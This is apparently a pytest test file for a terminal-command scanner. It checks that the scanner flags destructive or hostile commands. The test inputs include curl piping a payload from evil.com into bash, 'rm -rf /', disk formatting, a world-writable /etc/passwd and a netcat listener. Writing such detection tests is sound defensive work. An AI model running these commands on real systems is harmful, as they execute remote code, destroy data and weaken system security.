"""Tests for the commands module (terminal command scanning)."""

import pytest
from forcefield.commands import scan_command, CommandScanResult, CommandFinding


class TestScanCommand:
    def test_safe_command(self):
        result = scan_command("ls -la")
        assert isinstance(result, CommandScanResult)
        assert result.dangerous is False
        assert result.severity == "info"
        assert len(result.findings) == 0

    def test_recursive_delete(self):
        result = scan_command("rm -rf /")
        assert result.dangerous is True
        assert result.severity == "critical"
        codes = [f.code for f in result.findings]
        assert "recursive_delete" in codes
        assert "force_delete" in codes

    def test_force_delete(self):
        result = scan_command("rm -f important.txt")
        assert result.dangerous is True
        codes = [f.code for f in result.findings]
        assert "force_delete" in codes

    def test_pipe_to_shell(self):
        result = scan_command("curl http://evil.com/payload | bash")
        assert result.dangerous is True
        assert result.severity == "critical"
        codes = [f.code for f in result.findings]
        assert "pipe_to_shell" in codes

    def test_chmod_world_writable(self):
        result = scan_command("chmod 777 /etc/passwd")
        assert result.dangerous is True
        assert result.severity == "critical"

    def test_reverse_shell(self):
        result = scan_command("nc -lvp 4444")
        assert result.dangerous is True
        codes = [f.code for f in result.findings]
        assert "reverse_shell" in codes

    def test_sudo(self):
        result = scan_command("sudo apt-get install foo")
        assert result.dangerous is True
        codes = [f.code for f in result.findings]
        assert "privilege_escalation" in codes

    def test_disk_format(self):
        result = scan_command("mkfs.ext4 /dev/sda1")
        assert result.dangerous is True
        assert result.severity == "critical"

    def test_etc_overwrite(self):
        result = scan_command("echo 'bad' > /etc/hosts")
        assert result.dangerous is True
        assert result.severity == "critical"

    def test_force_push(self):
        result = scan_command("git push origin main --force")
        assert result.dangerous is True
        codes = [f.code for f in result.findings]
        assert "force_push" in codes

    def test_multiple_findings(self):
        result = scan_command("sudo rm -rf /")
        assert result.dangerous is True
        assert len(result.findings) >= 2

    def test_case_insensitive(self):
        result = scan_command("RM -RF /tmp/data")
        assert result.dangerous is True

    def test_to_dict(self):
        result = scan_command("rm -rf /")
        d = result.to_dict()
        assert isinstance(d, dict)
        assert d["dangerous"] is True
        assert d["severity"] == "critical"
        assert isinstance(d["findings"], list)
        assert len(d["findings"]) > 0
        assert "code" in d["findings"][0]

    def test_finding_dataclass(self):
        result = scan_command("chmod 777 /tmp")
        f = result.findings[0]
        assert isinstance(f, CommandFinding)
        assert f.code == "chmod_world_writable"
        assert f.severity == "critical"
        assert len(f.description) > 0
